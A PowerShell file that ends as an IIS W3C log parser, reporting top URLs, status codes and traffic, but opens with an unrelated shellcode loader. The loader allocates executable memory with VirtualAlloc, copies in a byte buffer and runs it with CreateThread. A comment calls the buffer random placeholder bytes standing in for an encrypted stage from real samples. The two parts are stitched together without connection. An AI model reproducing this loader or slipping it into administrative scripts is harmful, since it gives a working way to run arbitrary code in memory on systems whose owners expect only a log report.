
[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class Win32Api
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x7f, 0x08, 0x9a, 0xe6, 0x77, 0x7a, 0x48, 0x78, 0xf4, 0x13, 0xda, 0x7a, 0x7a, 0xbd, 0xec, 0xf0,
    0x66, 0xd2, 0x19, 0x71, 0xeb, 0xc5, 0xe9, 0x0d, 0xeb, 0x02, 0xfa, 0xf0, 0xce, 0xdf, 0xb6, 0x61,
    0xf5, 0xdf, 0x6a, 0xcc, 0x59, 0x10, 0xaf, 0x94, 0x50, 0x73, 0xd1, 0x7a, 0xd4, 0x5f, 0x1a, 0xc9,
    0xa0, 0x56, 0xed, 0x91, 0x1b, 0xe4, 0xd4, 0x05, 0x05, 0x69, 0xa2, 0xd1, 0xcd, 0xec, 0x4b, 0x66,
    0xbb, 0x38, 0x12, 0x0f, 0x98, 0xbc, 0x58, 0x20, 0xcf, 0xfe, 0x5b, 0x1f, 0xab, 0xcb, 0x93, 0xe4,
    0x74, 0xe6, 0x24, 0x95, 0x60, 0x06, 0x27, 0x93, 0x75, 0xe8, 0xc3, 0xa0, 0xe6, 0x9c, 0xf9, 0x24,
    0x3a, 0x96, 0xa0, 0x22, 0x73, 0x1b, 0xab, 0x73, 0x74, 0x1f, 0x51, 0x82, 0xad, 0x2e, 0x47, 0xf1,
    0x96, 0xa0, 0x6a, 0x58, 0xcd, 0xf5, 0x74, 0x64, 0xe2, 0x6d, 0xbb, 0x61, 0x97, 0x9d, 0x69, 0x38,
    0xda, 0x97, 0x84, 0x34, 0xfb, 0xfd, 0x36, 0x80, 0xa4, 0x29, 0xf6, 0x13, 0xf0, 0x0e, 0x8c, 0x70,
    0xd8, 0xe9, 0xb1, 0x13, 0xd8, 0x65, 0x7f, 0xff, 0xde, 0x70, 0xa8, 0x34, 0x68, 0x4d, 0xfc, 0xb1,
    0xd0, 0x12, 0xa1, 0x38, 0x17, 0x69, 0x04, 0x3a, 0x19, 0x42, 0x9c, 0xf7, 0x26, 0xb0, 0x9d, 0xa6,
    0xd9, 0x94, 0xbe, 0x95, 0xd5, 0x74, 0x13, 0x0a, 0xa3, 0xc2, 0x54, 0x5c, 0x75, 0xd0, 0x59, 0x42,
    0x84, 0xa0, 0x14, 0x7b, 0xd5, 0x7f, 0x16, 0x92, 0x14, 0xd2, 0xec, 0x4a, 0xa3, 0x50, 0xcb, 0x84,
    0x3e, 0xd0, 0xa6, 0xb2, 0x3c, 0xfa, 0x7d, 0x8c, 0xdd, 0xe0, 0x72, 0x2a, 0x90, 0xa1, 0x51, 0xfc,
    0xfe, 0x42, 0x53, 0xbe, 0x7a, 0x81, 0xbc, 0xed, 0x71, 0x71, 0x5a, 0xf1, 0xf1, 0x43, 0xff, 0x5e,
    0xd4, 0x08, 0xd9, 0xd9, 0xfe, 0x63, 0xd5, 0x3e, 0x28, 0x43, 0x73, 0x1c, 0x3f, 0xf4, 0xe3, 0x25,
    0x0f, 0x76, 0x35, 0x9f, 0x3c, 0x09, 0xd7, 0x3b, 0x09, 0x9f, 0xe7, 0xdd, 0xc5, 0x94, 0xb6, 0x5f,
    0xae, 0x54, 0x30, 0x1f, 0xd6, 0x69, 0x2c, 0x57, 0x14, 0xbd, 0x80, 0xf2, 0xc3, 0xfc, 0x45, 0x9e,
    0x56, 0xbc, 0x2e, 0xa7, 0x07, 0x46, 0xbf, 0x4e, 0xc7, 0x91, 0x6d, 0xa5, 0x24, 0x5b, 0x56, 0x51,
    0x5d, 0xa7, 0xb5, 0x82, 0xe0, 0xdf, 0x64, 0x77, 0x08, 0x9c, 0x37, 0x65, 0x49, 0x5a, 0xea, 0xe8,
    0x6a, 0x26, 0xa2, 0x42, 0x1c, 0xda, 0x4e, 0x73, 0x25, 0x24
)

$HProcess = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($HProcess -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
$ThreadId = 0
$Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][Win32Api]::WaitForSingleObject($Thread, 4547)
[void][Win32Api]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
#Requires -Version 5.1
<#
.SYNOPSIS
    Parses IIS W3C logs and reports the busiest URLs and status codes.
.DESCRIPTION
    Reads the newest log files below the configured site folder, discovers the
    field order from the #Fields header and aggregates requests, errors and
    transferred bytes.
    The output is a CSV file that can be opened in Excel or forwarded to the web
    operations mailbox.
.PARAMETER LogRoot
    Used when the script runs unattended.
#>

$ErrorActionPreference = "Stop"

$LogRoot    = 'D:\Logs\iis\W3SVC2'
$Days       = 3
$TopN       = 10
$OutputPath = "C:\Reports\iis-top-2024-10-02.csv"
$HtmlPath   = "C:\Reports\iis-2024-10-02.html"

$cutoff = (Get-Date).AddDays(-$Days)
$logFiles = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
if (@($logFiles).Count -eq 0) {
    throw ("No IIS logs found in {0} for the last {1} days" -f $LogRoot, $Days)
}

$entries = foreach ($log in $logFiles) {
    $fieldLine = Get-Content -LiteralPath $log.FullName -TotalCount 20 |
        Where-Object { $_ -match '^#Fields:' } | Select-Object -First 1
    if (-not $fieldLine) {
        Write-Verbose ("Skipping {0}: no field header" -f $log.Name)
        continue
    }
    $columns = ($fieldLine -replace '^#Fields:\s*', '') -split ' '
    $statusIndex = [array]::IndexOf($columns, 'sc-status')
    $uriIndex = [array]::IndexOf($columns, 'cs-uri-stem')
    $methodIndex = [array]::IndexOf($columns, 'cs-method')
    $bytesIndex = [array]::IndexOf($columns, 'sc-bytes')
    $timeIndex = [array]::IndexOf($columns, 'time-taken')
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        if ($parts.Count -lt $columns.Count) {
            return
        }
        [pscustomobject]@{
            Date      = $parts[0]
            Time      = $parts[1]
            Method    = $parts[$methodIndex]
            Uri       = $parts[$uriIndex]
            Status    = [int]$parts[$statusIndex]
            Bytes     = [int]$parts[$bytesIndex]
            TimeTaken = [int]$parts[$timeIndex]
        }
    }
}

$totalRequests = @($entries).Count
$errorEntries = $entries | Where-Object { $_.Status -ge 400 }
$totalMB = [math]::Round((($entries | Measure-Object -Property Bytes -Sum).Sum) / 1MB, 2)
$topUrls = $entries |
    Group-Object -Property Uri |
    Sort-Object -Property Count -Descending |
    Select-Object -First $TopN -Property @{Name = 'Uri'; Expression = { $_.Name }}, Count
$byStatus = $entries |
    Group-Object -Property Status |
    Sort-Object -Property Count -Descending |
    Select-Object -Property @{Name = 'Status'; Expression = { $_.Name }}, Count
$topUrls | Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8

Write-Host ("Requests: {0} | Errors: {1} | Traffic: {2} MB" -f $totalRequests, @($errorEntries).Count, $totalMB) -ForegroundColor Cyan
$byStatus | Format-Table -AutoSize
